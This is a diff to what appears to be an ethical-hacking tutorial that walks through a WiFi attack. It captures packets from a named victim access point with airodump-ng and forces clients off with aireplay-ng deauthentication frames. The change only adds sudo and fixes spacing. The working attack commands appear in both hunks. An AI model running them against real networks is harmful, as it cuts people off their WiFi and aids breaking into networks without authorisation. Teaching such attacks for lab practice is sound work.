@@ -175,7 +175,7 @@ A wireless Adapter that supports monitor mode and packet injection
 
 9. Filter packets down to focus on viction wifi access point
    ```sh
-   airodump-ng -c 11 --bssid CC:E1:D5:30:51:F8-w ~/ethical-hacking/misc/hack-01 wlan0
+   sudo airodump-ng -c 11 --bssid CC:E1:D5:30:51:F8 -w ~/ethical-hacking/misc/hack-01 wlan0
    ```
    * airodump-ng : For packet capturing
    * -c : Channel
@@ -185,7 +185,7 @@ A wireless Adapter that supports monitor mode and packet injection
 
 10. Deauthorize client from wifi network
     ```sh
-    aireplay-ng -0 99 -a CC:E1:D5:30:51:F8 wlan0
+    sudo aireplay-ng -0 99 -a CC:E1:D5:30:51:F8 wlan0
     ```
     * aireplay-ng : To inject frames
     * -0 : For deauthentication
